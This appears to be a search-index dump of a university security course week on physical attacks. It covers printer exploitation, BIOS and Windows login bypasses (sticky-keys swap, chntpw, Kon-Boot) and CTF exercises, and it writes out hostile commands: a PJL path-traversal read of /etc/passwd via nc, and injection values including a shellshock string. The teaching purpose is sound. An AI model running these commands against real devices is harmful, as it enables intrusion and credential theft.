(CVE-2014-6271)](http://seclists.org/oss-sec/2014/q3/650) $ lpdtest.py printer in '() {:;}; /bin/ping -c1 1.2.3.4' As expected these attacks were already fixed. My printer spit out a few pages with lines like \u201cIf you can read this lpdtest.py XYZ failed!\u201d So the result here some wasted paper and ink\u2026 Summary Why Printer Exploitation? (most) printers are already full blown computers! Printer as port/network/exploits scanner Computing/hash-cracking/sniffing Malware upload \u201cStealth\u201d/\u201cuncleanable\u201d command and control Unencrypted data theft Afterthoughts How many people would expect their printers is infected? How many users/admins/security-auditors audit and hard secure their network printers? How many persons or anti malware products could clean such a malware? \u2026? Outlook and closing words If I get the hands on some nicer printer I will deliver some exploit stuff later on I promise. If I get some more time to get a breakdown of my current home printer so I can take a look under the hood and to figure something out. An example here would be to capture a firmware update and trying to unpack/reverse that one. This would take a lot more time and preparation of my part, which would cause serious delay to this article as well. So I\u2019m keeping it rather open ended now, but I hope I could inspire some minds here to take a closer look as well. Furthermore I hope this article reached the people who were interested and were able learn some things. So if you want to try to exploit your own device, just try it out! Remember: Find a way into the system, Check for the used printer languages and try code injection techniques for these, Try dumping the file system directory structure from the web interface, Upload self created \u201cmalicious\u201d firmware if it is supported, Find a new way I\u2019m looking forward to feedback and improvement suggestions. Further readings Article related resources: LPD RFC 17 SMB RFC 17 IPP RFC 16 How Network Printing Works 11 PostScript Manual 7 BeEF 18 Praeda 18 PRET 328 Linux Exploit Suggester 31 Printer Security Test Cheat Sheet 44 Hacking Printers Wiki 27 Extras: Running DOOM on a Printer 61 From patched to Pwnd 23 Thousands of printers hacked across the globe after critical flaw exposed 25 Cross_Site_Printing 26 Exercise (4 pt) GO!! Chase the free wave! [-] ~~Hackergame 2021 challenge \"\u53bb\u5427\uff01\u8ffd\u5bfb\u81ea\u7531\u7684\u7535\u6ce2\"~~ [+] Inspired by Hackergame. Original created challenge. [an interesting story] OK now you have this mp3 file, please find the flag. video.mp3 Hint1: it's too fast to understand! Hint2: if I can let the time move backwards, this might be easier. Hint3: some online OCR might be helpful. For example, https://speech-to-text-demo.ng.bluemix.net/ (4 pt) Mechanical Keyboard Have you faced the situation, that your roommate is playing games so late and the sound of mechanical keyboard is super noisy? Meanwhile, especially you have midterm exam the next day. You decide to record this sound and try to find some interesting key taps from your roommate. (Account password, secret chat with girlfriend, or pxxxhub keywords...) dist.zip Hint1: the key taps only contain lower case characters and spaces. Hint2: keyboard sniffing paper: https://www.davidsalomon.name/CompSec/auxiliary/KybdEmanation.pdf Hint3: online key tap detector: https://keytap2.ggerganov.com/ Hint4: another (faster) method: recognize key tap sound, generate a substitution cipher and break. Hint5: flag only contains lower case characters and underline (replace all spaces to underlines). Example program to generate key sound average: from scipy.io import wavfile samplerate, data = wavfile.read('./output.wav') i = 0 countsilent = 0 samplefound = 0 avg = [] start = 0 end = 0 avg.append([0]) for sample in data: i+=1 if(sample[1]<100): countsilent += 1 if(countsilent > 10000 and sample[1]>100): countsilent = 0 #print(str(i)+\": sample found\") start = i samplefound = 1 if(countsilent > 8000 and samplefound==1): samplefound = 0 #print(str(i)+\": sample ended\") end = i avg[len(avg)-1]=avg[len(avg)-1]/(end-start) print(\"avg: \"+str(avg[len(avg)-1])) avg.append([0]) if (samplefound == 1): avg[len(avg)-1] += sample[1] Example program to map sound to character: alphabet = \"abcdefghijklmnopqr stuvwxyz\" avg = {} i=0 res=\"\" with open(\"avg\") as file: for line in file: value = line.rstrip()[6:-1] #print(value) if str(value) not in avg: avg[str(value)]=alphabet[i] i+=1 res+=avg[str(value)] print(avg) print(res) Online substitution cipher solver: https://www.boxentriq.com/code-breaking/cryptogram (2 pt) Free USB A stranger has left his USB on my desk. [plug in...] OMG my mouse is out of control! usb.pcapng Hint1: packet is a USB capture, used for Logitech Optical Mouse. Hint2: IRP ID is the only part changes in capture, which represents the mouse move. Hint3: Gnuplot is an application to simulate mouse clicks. Hint4: the first word in flag is \"tHE\".","title":"Week8 MISC: Physical Attacks"},{"location":"CS315/Week%208/#week8-misc-physical-attacks","text":"","title":"Week8 MISC: Physical Attacks"},{"location":"CS315/Week%208/#bios-password","text":"","title":"BIOS password"},{"location":"CS315/Week%208/#the-battery","text":"Most of the motherbords have a battery . If you remove it 30min the settings of the BIOS will be restarted (password included).","title":"The battery"},{"location":"CS315/Week%208/#jumper-cmos","text":"Most of the motherboards have a jumper that can restart the settings. This jumper connects a central pin with another, if you connect thoses pins the motherbord will be reseted .","title":"Jumper CMOS"},{"location":"CS315/Week%208/#live-tools","text":"If you could run for example a Kali Linux from a Live CD/USB you could use tools like killCmos* * or CmosPWD* (this last one is included in Kali) you could try to recover the password of the BIOS *.","title":"Live Tools"},{"location":"CS315/Week%208/#online-bios-password-recovery","text":"Put the password of the BIOS 3 times wrong , then the BIOS will show an error messag e and it will be blocked. Visit the page https://bios-pw.org and introduce the error code shown by the BIOS and you could be lucky and get a valid password (the same search could show you different passwords and more than 1 could be valid ).","title":"Online BIOS password recovery"},{"location":"CS315/Week%208/#uefi","text":"To check the settings of the UEFI and perform some kind of attack you should try chipsec . Using this tool you could easily disable the Secure Boot: python chipsec_main.py -module exploits.secure.boot.pk","title":"UEFI"},{"location":"CS315/Week%208/#ram","text":"","title":"RAM"},{"location":"CS315/Week%208/#cold-boot","text":"The RAM memory is persistent from 1 to 2 minutes from the time the computer is powered off. If you apply cold (liquid nitrogen, for example) on the memory card you can extend this time up to 10 minutes . Then, you can do a memory dump (using tools like dd.exe, mdd.exe, Memoryze, win32dd.exe or DumpIt) to analyze the memory. You should analyze the memory using volatility .","title":"Cold boot"},{"location":"CS315/Week%208/#inception","text":"Inception is a physical memory manipulation and hacking tool exploiting PCI-based DMA. The tool can attack over FireWire , Thunderbolt , ExpressCard , PC Card and any other PCI/PCIe HW interfaces. Connect your computer to the victim computer over one of those interfaces and INCEPTION will try to patch the pyshical memory to give you access . If INCEPTION succeeds, any password introduced will be vaid. It doesn't work with Windows10.","title":"INCEPTION"},{"location":"CS315/Week%208/#live-cdusb","text":"","title":"Live CD/USB"},{"location":"CS315/Week%208/#sticky-keys-and-more","text":"SETHC: sethc.exe is invoked when SHIFT is pressed 5 times UTILMAN: Utilman.exe is invoked by pressing WINDOWS+U OSK: osk.exe is invoked by pressing WINDOWS+U, then launching the on-screen keyboard DISP: DisplaySwitch.exe is invoked by pressing WINDOWS+P These binaries are located inside C:\\Windows\\System32* *. You can change any of them for a copy of the binary cmd.exe (also in the same folder) and any time that you invoke any of those binaries a command prompt as SYSTEM** will appear.","title":"Sticky Keys and more"},{"location":"CS315/Week%208/#modifying-sam","text":"You can use the tool chntpw* * to modify the SAM* file * of a mounted Windows filesystem. Then, you could change the password of the Administrator user, for example. This tool is available in KALI. chntpw -h chntpw -l <path_to_SAM> Inside a Linux system you could modify the /etc/shadow* * or /etc/passwd* file. *","title":"Modifying SAM"},{"location":"CS315/Week%208/#kon-boot","text":"Kon-Boot is one of the best tools around which can log you into Windows without knowing the password. It works by hooking into the system BIOS and temporarily changing the contents of the Windows kernel while booting (new versions work also with UEFI ). It then allows you to enter anything as the password during login. The next time you start the computer without Kon-Boot, the original password will be back, the temporary changes will be discarded and the system will behave as if nothing has happened. Read More: https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/ It is a live CD/USB that can patch the memory so you won't need to know the password to login . Kon-Boot also performs the StickyKeys trick so you could press Shift* * 5 times to get an Administrator cmd**.","title":"Kon-Boot"},{"location":"CS315/Week%208/#running-windows","text":"","title":"Running Windows"},{"location":"CS315/Week%208/#initial-shortcuts","text":"","title":"Initial shortcuts"},{"location":"CS315/Week%208/#booting-shortcuts","text":"supr - BIOS f8 - Recovery mode supr - BIOS ini f8 - Recovery mode Shitf (after the windows banner) - Go to login page instead of autologon (avoid autologon)","title":"Booting shortcuts"},{"location":"CS315/Week%208/#bad-usbs","text":"","title":"BAD USBs"},{"location":"CS315/Week%208/#rubber-ducky-tutorials","text":"Tutorial 1 Tutorial 2","title":"Rubber Ducky tutorials"},{"location":"CS315/Week%208/#teensyduino","text":"Payloads and tutorials There are also tons of tutorials about how to create your own bad USB .","title":"Teensyduino"},{"location":"CS315/Week%208/#volume-shadow-copy","text":"With administrators privileges and powershell you could make a copy of the SAM file. See this code .","title":"Volume Shadow Copy"},{"location":"CS315/Week%208/#bypassing-bitlocker","text":"Bitlocker uses 2 passwords . The one used by the user , and the recovery password (48 digits). If you are lucky and inside the current session of Windows exists the file C:\\Windows\\MEMORY.DMP* * (It is a memory dump) you could try to search inside of it the recovery password . You can get this file and a copy of the filesytem and then use Elcomsoft Forensic Disk Dercyptor to get the content (this will only work if the password is inside the memory dump). You coud also force the memory dump * using NotMyFault* of Sysinternals, but this will reboot the system and has to be executed as Administrator. You could also try a bruteforce attack using *Passware Kit Forensic* .","title":"Bypassing Bitlocker"},{"location":"CS315/Week%208/#an-introduction-to-printer-exploitation","text":"","title":"An Introduction to Printer Exploitation"},{"location":"CS315/Week%208/#preface","text":"Note: As always the following is just a digest of all the things I could observe by working on printers myself or facts from stuff I read about recently. Since this thread about the HP printer promo videos 3 caught some attention I will try to shed some light onto the field which was displayed there. First of all we should keep in mind this was a promo video made by a company. So always ask yourself this: \u201cHow real are the displayed scenarios, or are these just \u2018Hollywood fabrications\u2019?\u201d I had some access to different printers over the last couple of month and learned some basic principles, which I wanna share with you as good as possible now. Printer use a various amount of protocols and firmwares which differ from vendor to vendor and model to model. So this first part might be boring to some, you can try to skip the theoretical part and jump right to the exploitation paragraph, but talking about fundamentals will cover important topics.","title":"Preface"},{"location":"CS315/Week%208/#printer-as-an-attack-vector","text":"So why would I even want to target a printer in the first place? Why not just target Desktop or Server environments with malware as usual? We get to that in next couple of paragraphs","title":"Printer as an attack vector?"},{"location":"CS315/Week%208/#required-skills","text":"Not much to mention here basic ability to read for more than 5 minutes","title":"Required Skills"},{"location":"CS315/Week%208/#printer-a-viable-target-or-just-wasted-time","text":"","title":"Printer a viable target or just wasted time?"},{"location":"CS315/Week%208/#local-vs-network-printers","text":"Local printers are just directly connected to a desktop PC and are rather uninteresting. These days almost all printers seem to be network printers though. So basically network printing enables users in locations geographically separate from each other and from their print devices to produce documents for themselves and others. Print servers enable multiple clients to share one or more print devices. So far so easy right? Let\u2019s jump directly to some highlevel view which explains every network printer quite well.","title":"Local vs Network printers"},{"location":"CS315/Week%208/#highlevel-view","text":"A highlevel view of current network printers might look something like this: +----------------------------------------------------+ | Network printing protocols | Printing channel +-------------------------------+--+ | | | IPP, LPD, SMB, raw port 9100 | | | +--------------------------------------------------+ | | job/printer control langs. | | Printer language +-----------------------------+--+ | | | | | PJL, PML | | | | | | +------------------------+ | | | | Page descr. langs. | | | | +------------------------+---+ | | | | | | | | | PS, PCL, PDF, XPS, ... | | | | | | | | | +----------------------------+ | | +--------------------------------+ | +----------------------------------+ Note: This diagram might be incomplete! =The network printing protocol acts as a channel to deploy print jobs, which either contain the page description language directly or first invoke a printer/job control language! Let\u2019s take a look at each of those sections in the diagram above more closely and cover some fundamentals.","title":"Highlevel view"},{"location":"CS315/Week%208/#fundamentals","text":"","title":"Fundamentals"},{"location":"CS315/Week%208/#firmware","text":"Printer use, in my experience a couple of different operating systems for embedded devices. I\u2019ll list a few of them here, but won\u2019t really dive into them, since it would go beyond the scope of this article. Basic but slimmed down GNU/Linux, often custom tailored, WindRiver Linux 54 , VxWorks 38 , ThreadX 28 . With the different, but limited pool of printers I\u2019ve had access to all of them had some things in common in the end. slimmed down instruction/command set - reduced functionality, \u2018legacy kernels\u2019 - often around kernel version 2.6.XYZ, might include \u2018hidden\u2019 functionality, which can be enabled through a little patch - e.g.: ssh files are there, but need to be enabled in config files, ssh is more present in printers designed for offices, compared to home printers for some reason, sometimes the way the firmware is stored is hilarious - e.g.: on a SD card you can remove/switch within 30 seconds of physical access These facts show that printers might be vulnerable to certain attacks, but still these attacks often are made more \u2018complicated\u2019, because certain functions aren\u2019t even there or somehow have to get enabled through (remote) file system writes\u2026 Next a wild bunch of protocols is used for communication between Printers, print servers, desktop PCs and even internally within a printer. Let\u2019s take a look!","title":"Firmware"},{"location":"CS315/Week%208/#network-printing-protocols","text":"To summarize it right away there are a bunch of \u2018exotic\u2019 protocols for network printing (NCP or AppleTalk for example) To explain and mention them all here would be too much again. If anyone is interested in some specifics or a follow up post I\u2019d answer any questions there. In the Windows world, SMB/CIFS printer are popular. The most common printing protocols supported directly by network printers however are LPD, IPP, and raw port 9100 printing, which I will explain a bit more in depth now. Furthermore, some devices support printing over generic protocols such as FTP or HTTP file uploads as well.","title":"Network printing protocols"},{"location":"CS315/Week%208/#lpd","text":"LPD is short for \u2018Line Printer Daemon\u2019-protocol. It runs on port 515/TCP and can be accessed by using \u2018lpr\u2019 over the CLI. To print things, the client sends a control file defining job/username and a data file containing the actual data to be printed.","title":"LPD"},{"location":"CS315/Week%208/#ipp","text":"IPP is an extendable protocol and based on HTTP, so it inherits all existing security features like basic authentication and SSL/TLS encryption. To submit a print job, a HTTP POST request is sent to the IPP server, which listens on 631/TCP. For anyone wondering CUPS is an IPP implementation, which is a default printing system in many Linux distributions and macOS X.","title":"IPP"},{"location":"CS315/Week%208/#smb","text":"SMB, short for \u2018Server Message Block\u2019 is an application-layer network protocol, which handles file and printer sharing. It\u2019s used by default on Windows. Usually it runs on 445/TCP.","title":"SMB"},{"location":"CS315/Week%208/#port-9100","text":"Also known as \u2018raw printing\u2019, since it makes use of connecting to 9100/TCP of a network printer. It is the default method used by CUPS and the Windows printing architecture. Here all data sent is directly processed by the printing device, just like a parallel connection over TCP. In contrast to LPD, IPP and SMB interpreted printer control/page description languages, this one here is capable of sending direct feedback to the client, including status and error messages. So we have a bidirectional channel here, which directly can give us access to results of the Printer control languages!","title":"Port 9100"},{"location":"CS315/Week%208/#printer-control-languages","text":"Basically a job control language manages settings like output trays for the current job. It often just sits in between the printing protocol and the page description language. Printer control and management languages are designed to affect not only a single print job but the device as a whole. I\u2019m not too knowledgeable here but the two most basic ones are listed below.","title":"Printer Control Languages"},{"location":"CS315/Week%208/#snmp","text":"SNMP, short for \u2018Simple Network Management Protocol\u2019 listens on 161/UDP. Was designed to manage network components","title":"SNMP"},{"location":"CS315/Week%208/#pjl","text":"PJL, short for \u2018Printer Job Language\u2019 is the kinda de-facto standard now Can be used to manipulate general settings, also with permanent changes. There are many dialects as vendors tend to support only a subset of the commands listed in the PJL reference and instead prefer to add proprietary ones. PJL is also used to set the file format of the actual print data to follow, which makes it interesting for various attacks.","title":"PJL"},{"location":"CS315/Week%208/#page-description-languages-pdl","text":"This one basically specifies how the actual document will look like appearance wise. Here comes the printer driver into play which kinda translate the file to be printed into a PDL that is understood by the printer.","title":"Page Description Languages (PDL)"},{"location":"CS315/Week%208/#postscript-ps","text":"Is well known and made by Adobe and is widely used as a PDL. PS is capable of far more than just defining the appearance of the document and handling vector graphics though. That\u2019s why, when used correctly, PS can be used for a variety of attacks such as denial of service (for example, through infinite loops), print job manipulation and retention as well as gaining access to the printer\u2019s file system.","title":"PostScript (PS)"},{"location":"CS315/Week%208/#pcl","text":"As a minimalist page description language supported by a wide variety of vendors and devices. Is also a de-facto Standard nowadays. It\u2019s also not intended to get direct access to the underlying filesystem. So it\u2019s not that well suited for exploitation purposes, but still has it\u2019s place for such purposes as well.","title":"PCL"},{"location":"CS315/Week%208/#possible-exploits","text":"","title":"Possible Exploits"},{"location":"CS315/Week%208/#who-would-put-a-printer-on-the-internet","text":"I just leave this data as a first expression here shodan count port:9100 pjl 29111 [7/07/20 7:42:13] dev@ops shodan count port:515 lpd 50607 [7/07/20 7:42:46] dev@ops shodan count port:631 ipp 90760 [7/07/20 7:43:10] dev@ops shodan count port:161 snmp 7876 Data from: 07.07.2020","title":"Who would put a printer on the Internet?"},{"location":"CS315/Week%208/#attack-vectors","text":"","title":"Attack Vectors"},{"location":"CS315/Week%208/#remote","text":"As easily seen above a lot of printers are connected to the Internet through port 9100, which make them attackable. You either know the IP or can just scan for some in your neighborhood radius/ check shodan. Once you have some you might get a SSH connection going. Often standard login credentials are still used, which you can easily scrape from the Internet\u2026","title":"Remote"},{"location":"CS315/Week%208/#inside-job","text":"If you have physical access to the printer you can also plug in an USB drive or even a SD card.","title":"Inside job"},{"location":"CS315/Week%208/#possible-mayhem-one-can-cause","text":"So now we\u2019re kinda back to the linked topic at the beginning of the small web series directed by HP. So how realistic are the shown scenarios?","title":"Possible Mayhem one can cause\u2026"},{"location":"CS315/Week%208/#dos","text":"Transmission Channel - basically block the/one printing port to keep the printer busy and don\u2019t print anything anymore. Document processing - manipulate a Document via PDL and let the printer interpret it\u2026 e.g.: an infinite loop in PS. Physical damage - malware causing writes on NVRAM chips which have a life expectancy of ~10^5 writes 30 .","title":"DoS"},{"location":"CS315/Week%208/#privilege-escalation","text":"Factory defaults - reset to factory defaults to bypass authentication. Accounting bypass - similar thing here, printing without authentication.","title":"Privilege Escalation"},{"location":"CS315/Week%208/#print-job-access","text":"Print job retention - Try to find stored print jobs on the printer and extract those. Print job manipulation - Alter print jobs. You can imagine the possible mayhem caused itself.","title":"Print Job Access"},{"location":"CS315/Week%208/#information-disclosure","text":"Memory access - may lead to finding sensitive data like passwords or printed documents. File system access - potentially retrieve sensitive information like configuration files or stored print jobs. Credential disclosure - brute force attacks against changed default login credentials to gain access","title":"Information Disclosure"},{"location":"CS315/Week%208/#code-execution","text":"Buffer overflows - printers provide additional languages and network services, potentially prone to this kind of attack Firmware updates - it is common for printers to deploy firmware updates as ordinary print jobs cough malicious firmware cough Software packages - \u2018custom tailored and manipulated printer apps\u2019","title":"Code Execution"},{"location":"CS315/Week%208/#misc","text":"Malware - target network printers and spread it in local networks to other peers.","title":"Misc"},{"location":"CS315/Week%208/#possible-scenarios","text":"Depending on the planned attack and possible access one has a variety of attack vectors. One need more planning than others. Some need physical access and some can be done from remote. Combinations of those are easily possible! For example issuing a malicious firmware update via a simple print job (possible case: no authentication needed), which extracts sensitive data and renders the printer useless. -Printer \u2018ransomware\u2019 may be a thing, even if it sounds kinda weird. So to conclude this section, I think the shown attacks in the videos were presented a tad to \u2018flashy\u2019, but are indeed possible depending on the printers and network they are placed in.","title":"possible scenarios"},{"location":"CS315/Week%208/#tools","text":"A lot of these techniques mentioned above need some serious work or knowledge about the underlying structure ( e.g.: used PDL, PCL). Even though these might be fairly easily found out using manuals or online search it\u2019s still a hassle and extra work. So people already made our lifes more easy by providing tools for almost all tasks mentioned above :).","title":"Tools"},{"location":"CS315/Week%208/#beef","text":"The Browser Exploitation Framework (BeEF) is a penetration testing tool that focuses on the web browser. It allows the penetration tester to assess the actual security posture of a target environment by using client-side attack vectors. This is not really printer specific, but it is a framework to implement cross-site printing 48 functionality.","title":"BeEF"},{"location":"CS315/Week%208/#praeda","text":"Praeda - \u201cAn Automated Printer Data Harvesting Tool\u201d written in perl. Also a tool to help pentesters to gather usable data during security assessment jobs. Praeda systematically collects sensitive information from the printer\u2019s embedded web server. This includes device passwords, usernames, email addresses which might be available publicly on the web interface.","title":"Praeda"},{"location":"CS315/Week%208/#pret-328","text":"This one is real nifty tool written in python to check for basically every attack vector I mentioned above. It tries to connect to the printer via network or USB and tries to exploit the used printer languages, currently supported are PS, PJL and PCL. When successfully connected one has a ton of available commands. A full list can be found on the Github, linked below.","title":"PRET 328"},{"location":"CS315/Week%208/#les","text":"Linux Exploit Suggester is a neat little perl script, which gives some options for possible exploits depending on your kernel. As stated above the kernel versions for embedded operating systems are often far lower, compared to current linux based desktop or server distributions. So old, usually fixed exploit techniques might still be viable here! Note: It is likely, that perl is not present in it\u2019s full range and copying it to a printer is extra work. Luckily one can run simply run in a desktop environment and specifying the kernel you want to exploit","title":"LES"},{"location":"CS315/Week%208/#my-home-printer-a-journey-to-find-a-way-in","text":"Ok what is a basic plan to concentrate on when trying to exploit a printer? I\u2019ve given a lot of theory until this point, as well as some \u201cDo\u2019s\u201d and \u201cMights\u201d. Maybe you\u2019ve got some ideas on your own already, but here\u2019s a little experimental journey from me. So first thing that is obvious is to check for open ports and an OS fingerprint. Luckily we have nmap. Nmap is bae for this.","title":"My home printer - a journey to find a way in!"},{"location":"CS315/Week%208/#wheres-the-door","text":"$ sudo nmap 192.168.1.108 Starting Nmap 7.01 ( https://nmap.org ) at 2017-09-11 20:13 CEST Nmap scan report for 192.168.1.108 Host is up (0.031s latency). Not shown: 993 closed ports PORT STATE SERVICE 80/tcp open http 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 515/tcp open printer 631/tcp open ipp 9100/tcp open jetdirect MAC Address: 44:D2:44:1C:73:E2 (Seiko Epson) Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds Device type: specialized Running: Linux 2.6.X OS CPE: cpe:/o:linux:linux_kernel:2.6 OS details: Linux 2.6.31 - 2.6.35 (embedded) Network Distance: 1 hop OS detection performed. Please report any incorrect results at https://nmap.org/submit/ . $ So we have the usual printing ports open, as well as some other basic ones. It is running an older Linux as well, so no big surprise there! No open 22/TCP port though. So causing mayhem on the file system is not possible as of now.","title":"Where\u2019s the door?"},{"location":"CS315/Week%208/#pret-and-done","text":"I\u2019ve praised PRET quite a bit above, so let\u2019s give it a try to check if my Epson printer has a nice, hopefully standard set of supported printer languages! $ python pret.py 192.168.1.108 -s PS Checking for IPP support: found Checking for HTTP support: found Checking for SNMP support: found Checking for PS support: not found $ $ python pret.py 192.168.1.108 -s Pjl Checking for IPP support: found Checking for HTTP support: found Checking for SNMP support: found Checking for PJL support: not found $ $ python pret.py 192.168.1.108 -s PCL Checking for IPP support: found Checking for HTTP support: found Checking for SNMP support: found Checking for PCL support: not found $ So no SSH and not even a standard version here\u2026 Most likely the result of my vendor using some exotic stuff again and not keeping things simple \u2026 Anyway using PRET is easy and self explanatory, once connected a help function will give you an overview of available stuff! From checking the file-system. creating directories, changing configuration files or even dumping the whole NVRAM. PRET can do it all (in theory that is ). After trying a few things to find a way to make PRET work for me I trashed that idea for now and moved on!","title":"PRET and done?"},{"location":"CS315/Week%208/#les_1","text":"So I wanted to have some fun now after the two disappointing results :D. So let\u2019s dig deeper into what Linux exploits might get suggested for our version! $ perl Linux_Exploit_Suggester.pl -k 2.6.31 Kernel local: 2.6.31 Searching among 65 exploits... Possible Exploits: [+] american-sign-language CVE-2010-4347 Source: http://www.securityfocus.com/bid/45408/ [+] can_bcm CVE-2010-2959 Source: http://www.exploit-db.com/exploits/14814/ [+] do_pages_move Alt: sieve CVE-2010-0415 Source: Spenders Enlightenment [+] half_nelson Alt: econet CVE-2010-3848 Source: http://www.exploit-db.com/exploits/6851 [+] half_nelson1 Alt: econet CVE-2010-3848 Source: http://www.exploit-db.com/exploits/17787/ [+] half_nelson2 Alt: econet CVE-2010-3850 Source: http://www.exploit-db.com/exploits/17787/ [+] half_nelson3 Alt: econet CVE-2010-4073 Source: http://www.exploit-db.com/exploits/17787/ [+] msr CVE-2013-0268 Source: http://www.exploit-db.com/exploits/27297/ [+] pipe.c_32bit CVE-2009-3547 Source: http://www.securityfocus.com/data/vulnerabilities/exploits/36901-1.c [+] pktcdvd CVE-2010-3437 Source: http://www.exploit-db.com/exploits/15150/ [+] ptrace_kmod2 Alt: ia32syscall,robert_you_suck CVE-2010-3301 Source: http://www.exploit-db.com/exploits/15023/ [+] rawmodePTY CVE-2014-0196 Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c [+] rds CVE-2010-3904 Source: http://www.exploit-db.com/exploits/15285/ [+] reiserfs CVE-2010-1146 Source: http://www.exploit-db.com/exploits/12130/ [+] video4linux CVE-2010-3081 Source: http://www.exploit-db.com/exploits/15024/ $ Note: If these are viable and meet all dependencies has to be checked of course, but a brief look at them made me decide not to spend too much effort here.","title":"LES"},{"location":"CS315/Week%208/#manual-pjl-injection","text":"So I thought why not check for PJL again and try invoking some command strings manually in combination with netcat as a listener! So I tried using: echo \"@PJL FSUPLOAD FORMAT:BINARY NAME=\"../../etc/passwd\" OFFSET=0 SIZE=648\" | nc -v -v 192.168.1.108 9100 # If successful this should display the */etc/passwd* file. or echo \"@PJL INFO ID\" | nc -v -v 192.168.1.108 9100 # If successful this should get the *printer\u2019s device information* as well as other PJL command injecting techniques, but my printer is not accepting any of these. It\u2019s not reacting at all to this kind of \u2018attack\u2019\u2026 I\u2019m not knowledgeable enough to launch this with PS and PCL as well, because their command syntax differs greatly (obviously). I\u2019m remaining with a note to search for PS and PCL attack strings.","title":"Manual PJL Injection"},{"location":"CS315/Week%208/#a-pret-test-script-to-the-rescue","text":"So PRET doesn\u2019t work for my home printer as seen above. Interestingly I found that there is a script \u201chidden\u201d within the PRET source folder called \u201clpdtest.py\u201d It can test for known, but older (like really older) vulnerabilities within the Line Printer Daemon, listed here 60 . This involves some basic tests:","title":"A PRET test script to the rescue?"},{"location":"CS315/Week%208/#get-test","text":"Trying to get (aka print) a file from printer\u2019s file system. $ lpdtest.py printer get /etc/passwd $ lpdtest.py printer get \u2026/\u2026/\u2026/etc/passwd etc\u2026","title":"\u2018get\u2019 Test"},{"location":"CS315/Week%208/#in-test","text":"This test is for fuzzing around with user input (hostname,username, jobname, filenames, etc.). This might be useful to test for interpretation of shell commands\u2026 # Test for environment variables $ lpdtest.py printer in '$UID' # Test for pipes and redirects $ lpdtest.py printer in '| pwd' $ lpdtest.py printer in '>/etc/passwd' # Test for backticks $ lpdtest.py printer in '`ls`' # Test for [shellshock (CVE-2014-6271)](http://seclists.org/oss-sec/2014/q3/650) $ lpdtest.py printer in '() {:;}; /bin/ping -c1 1.2.3.4' As expected these attacks were already fixed. My printer spit out a few pages with lines like \u201cIf you can read this lpdtest.py XYZ failed!\u201d So the result here some wasted paper and ink\u2026","title":"\u2018in\u2019 Test"},{"location":"CS315/Week%208/#summary","text":"","title":"Summary"},{"location":"CS315/Week%208/#why-printer-exploitation","text":"(most) printers are already full blown computers! Printer as port/network/exploits scanner Computing/hash-cracking/sniffing Malware upload \u201cStealth\u201d/\u201cuncleanable\u201d command and control Unencrypted data theft","title":"Why Printer Exploitation?"},{"location":"CS315/Week%208/#afterthoughts","text":"How many people would expect their printers is infected? How many users/admins/security-auditors audit and hard secure their network printers? How many persons or anti malware products could clean such a malware? \u2026?","title":"Afterthoughts"},{"location":"CS315/Week%208/#outlook-and-closing-words","text":"If I get the hands on some nicer printer I will deliver some exploit stuff later on I promise. If I get some more time to get a breakdown of my current home printer so I can take a look under the hood and to figure something out. An example here would be to capture a firmware update and trying to unpack/reverse that one. This would take a lot more time and preparation of my part, which would cause serious delay to this article as well. So I\u2019m keeping it rather open ended now, but I hope I could inspire some minds here to take a closer look as well. Furthermore I hope this article reached the people who were interested and were able learn some things. So if you want to try to exploit your own device, just try it out! Remember: Find a way into the system, Check for the used printer languages and try code injection techniques for these, Try dumping the file system directory structure from the web interface, Upload self created \u201cmalicious\u201d firmware if it is supported, Find a new way I\u2019m looking forward to feedback and improvement suggestions.","title":"Outlook and closing words"},{"location":"CS315/Week%208/#further-readings","text":"","title":"Further readings"},{"location":"CS315/Week%208/#article-related-resources","text":"LPD RFC 17 SMB RFC 17 IPP RFC 16 How Network Printing Works 11 PostScript Manual 7 BeEF 18 Praeda 18 PRET 328 Linux Exploit Suggester 31 Printer Security Test Cheat Sheet 44 Hacking Printers Wiki 27","title":"Article related resources:"},{"location":"CS315/Week%208/#extras","text":"Running DOOM on a Printer 61 From patched to Pwnd 23 Thousands of printers hacked across the globe after critical flaw exposed 25 Cross_Site_Printing 26","title":"Extras:"},{"location":"CS315/Week%208/#exercise","text":"","title":"Exercise"},{"location":"CS315/Week%208/#4-pt-go-chase-the-free-wave","text":"[-] ~~Hackergame 2021 challenge \"\u53bb\u5427\uff01\u8ffd\u5bfb\u81ea\u7531\u7684\u7535\u6ce2\"~~ [+] Inspired by Hackergame. Original created challenge. [an interesting story] OK now you have this mp3 file, please find the flag. video.mp3 Hint1: it's too fast to understand! Hint2: if I can let the time move backwards, this might be easier. Hint3: some online OCR might be helpful. For example, https://speech-to-text-demo.ng.bluemix.net/","title":"(4 pt) GO!! Chase the free wave!"},{"location":"CS315/Week%208/#4-pt-mechanical-keyboard","text":"Have you faced the situation, that your roommate is playing games so late and the sound of mechanical keyboard is super noisy? Meanwhile, especially you have midterm exam the next day. You decide to record this sound and try to find some interesting key taps from your roommate. (Account password, secret chat with girlfriend, or pxxxhub keywords...) dist.zip Hint1: the key taps only contain lower case characters and spaces. Hint2: keyboard sniffing paper: https://www.davidsalomon.name/CompSec/auxiliary/KybdEmanation.pdf Hint3: online key tap detector: https://keytap2.ggerganov.com/ Hint4: another (faster) method: recognize key tap sound, generate a substitution cipher and break. Hint5: flag only contains lower case characters and underline (replace all spaces to underlines). Example program to generate key sound average: from scipy.io import wavfile samplerate, data = wavfile.read('./output.wav') i = 0 countsilent = 0 samplefound = 0 avg = [] start = 0 end = 0 avg.append([0]) for sample in data: i+=1 if(sample[1]<100): countsilent += 1 if(countsilent > 10000 and sample[1]>100): countsilent = 0 #print(str(i)+\": sample found\") start = i samplefound = 1 if(countsilent > 8000 and samplefound==1): samplefound = 0 #print(str(i)+\": sample ended\") end = i avg[len(avg)-1]=avg[len(avg)-1]/(end-start) print(\"avg: \"+str(avg[len(avg)-1])) avg.append([0]) if (samplefound == 1): avg[len(avg)-1] += sample[1] Example program to map sound to character: alphabet = \"abcdefghijklmnopqr stuvwxyz\" avg = {} i=0 res=\"\" with open(\"avg\") as file: for line in file: value = line.rstrip()[6:-1] #print(value) if str(value) not in avg: avg[str(value)]=alphabet[i] i+=1 res+=avg[str(value)] print(avg) print(res) Online substitution cipher solver: https://www.boxentriq.com/code-breaking/cryptogram","title":"(4 pt) Mechanical Keyboard"},{"location":"CS315/Week%208/#2-pt-free-usb","text":"A stranger has left his USB on my 